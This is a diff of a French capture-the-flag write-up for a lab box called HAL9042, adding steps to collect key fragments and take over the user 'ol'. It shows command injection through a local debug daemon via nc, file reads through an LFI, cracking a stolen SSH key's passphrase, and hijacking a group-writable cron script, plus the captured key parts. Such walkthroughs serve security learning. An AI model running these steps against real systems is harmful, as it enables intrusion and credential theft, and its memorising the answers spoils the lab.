@@ -14,11 +14,43 @@ Toutefois on a une visu de l'escalade a realiser dans la description de l'applia
 |-------|-------------|-----|-------|
 |   1   | www-data    | 💻  |   ✅ [Clic](./write_up_3.md#a-prendre-le-controle-sur-www-data) |
 |   2   | paco        | 🔐  |   ✅  [Clic](./write_up_3.md#b-prendre-le-controle-sur-paco)|
-|   3   | wil         | 🕵️  |   ❌  |
-|   4   | sophie      | 🧠  |   ❌  |
+|   3   | wil         | 🕵️  |   ✅  [Clic](./write_up_3.md#c-prendre-le-controle-sur-wil)|
+|   4   | sophie      | 🧠  |   ✅  [Clic](./write_up_3.md#d-prendre-le-controle-sur-sophie)|
 |   5   | ol          | 🛡️  |   ❌  |
 |   6   | root        | 👑  |   ❌  |
 |*bonus*| xavier      |     |   ❌  |
+
+### RECUPERATION DES `.key_part`
+
+Les `.key_part` vont nous permettre de dechiffrer un rapport de `ol`.  
+Le script d'encryption de `paco` : `encrypt.py` nous explique qu'il nous faudra concatener les 4 `.key_part` dans un ordre precis afin de pouvoir dechiffrer le rapport : 
+
+1. `ol`
+
+2. `wil`  
+
+- **Prerequis** : Avoir le pivot `paco -> wil`.
+- **Recuperation** : 
+    - La `.key_part` de wil se trouve dans le dossier `/home/wil/data`
+    - On utilise le pivot pour `cat` la `.key_part` : `echo "DEBUG: cd /home/wil/data && cat .key_part" | nc 127.0.0.1 7042`
+- **Resultat** : `847_4n0m4l13s`
+
+3. `sophie`  
+
+- **Prerequis** : Avoir une connexion ssh a la session `sophie`
+- **Recuperation** : 
+    - Une fois sur la session de `sophie`, la `.key_part` se trouve dans le repertoire : `/home/sophie/drafts/.key_part`.  
+    - Depuis la session : `cd drafts/ && cat .key_part`
+- **Resultat** : `S0ph13_J14`
+
+4. `xavier`  
+
+- **Prerequis** : A minima pouvoir exploiter la `LFI` presentee dans le Write Up 1. 
+- **Recuperation** : 
+    - Dans plusieurs fichers systeme ou utilisateurs il y a des mentions faites sur `xavier`.
+    - Dans le fichier `encrypt.py` de `paco` on nous donne directement le chemin, `/tmp/.xn/.key_part`pas besoin de complexifier ici, on va utiliser la `LFI`.
+    - `./get_file.sh /tmp/.xn/.key_part`
+- **Resultat** : `uid1337`.
 
 ### FLAGS  
 | Number | Flag                                             |
@@ -191,6 +223,8 @@ nd5ef3HqPILkSJLtE8a2lgNktuuAQ=
 -----END OPENSSH PRIVATE KEY-----
 > ^C
 ```
+> [!INFO]
+> Dans mon cas c'etait deja fait, sinon ne pas oublier d'ajouter les perms pour la cle ssh de `sophie` : `chmod 600 id_rsa_sophie.enc`
 
 3. Se connecter avec la passphrase :  
 - Les indices suggerent que la passphrase de la cle ssh est l'un des mots de passes les plus communs.  
@@ -243,4 +277,63 @@ Testing: [iloveyou]
 Enter passphrase for key 'id_rsa_sophie.enc': iloveyou
 
 sophie@hal9042:~$ 
+```
+
+### E. Prendre le controle sur `ol`
+
+1. Depuis la session ssh de `sophie` il est possible de consulter `/home/ol/scripts/check.sh` :  
+```bash
+sophie@hal9042:/home/ol/scripts$ cat check.sh 
+#!/bin/bash
+# check.sh — HAL9042 health probe
+# Run from ol's crontab every 5 minutes. Writes a heartbeat to the log.
+#
+# ol: keep this lightweight. it runs as me, every 5 min, forever.
+
+LOG=/var/log/hal9042/check.log
+echo "$(date -u +%FT%TZ) [check] hal9042d heartbeat: nominal" >> "$LOG" 2>/dev/null
+echo "$(date -u +%FT%TZ) [check] confidence: nominal" >> "$LOG" 2>/dev/null
+```  
+
+2. C'est interessant car ce script est joue depuis la crontable de `ol` toutes les 5 minutes, donc avec ses privileges. Il n'est pas possible par exemple de consulter sa `.key_part`, mais les permissions sur le script sont les suivantes :  
+```bash
+sophie@hal9042:/home/ol/scripts$ ls -la
+-rwxrwxr-x 1 ol evalops  380 Jun  6 12:30 check.sh
+```  
+Les membres du groupe `evalops` possedent les droits `rwx` sur le script.  
+
+3. `wil` fait partie du groupe evalops :
+```bash
+sophie@hal9042:/home/ol/scripts$ getent group evalops
+evalops:x:1001:wil
+```
+
+4. Le pivot apparait donc clairement, il faut modifier le script `check.sh` depuis les privileges de `wil`, en essayant par exemple de cat la `.key_part` qui n'est `rw` seulement pour `ol`. Cela permettrait de confirmer l'escalation.
+
+5. **Realisation**  
+- Modification du script en append :
+```bash
+sophie@hal9042:/home/ol/scripts$ echo 'DEBUG:echo "echo \"\$(date -u +%FT%TZ) [KEYPART] \$(cd /home/ol/.config && cat .key_part)\" >> \"\$LOG\"" >> /home/ol/scripts/check.sh' | nc 127.0.0.1 7042
+HAL9042 evaluation daemon — v0.4 (build dev)
+Submit a project name to evaluate. One line per request.
+```
+
+- Verification : 
+
+```bash
+sophie@hal9042:/home/ol/.config$ cd ../scripts/ && cat check.sh
+#!/bin/bash
+# check.sh — HAL9042 health probe
+# Run from ol's crontab every 5 minutes. Writes a heartbeat to the log.
+#
+# ol: keep this lightweight. it runs as me, every 5 min, forever.
+
+LOG=/var/log/hal9042/check.log
+echo "$(date -u +%FT%TZ) [check] hal9042d heartbeat: nominal" >> "$LOG" 2>/dev/null
+echo "$(date -u +%FT%TZ) [check] confidence: nominal" >> "$LOG" 2>/dev/null
+echo "$(date -u +%FT%TZ) [KEYPART] cd /home/ol/.config && cat .key_part" >> "$LOG" ==> OK
+```
+- On attend l'execution par la crontable depuis les privileges de `ol` :
+```bash
+2026-09-23T14:15:02Z [KEYPART] M0ul1n3tt3
 ```
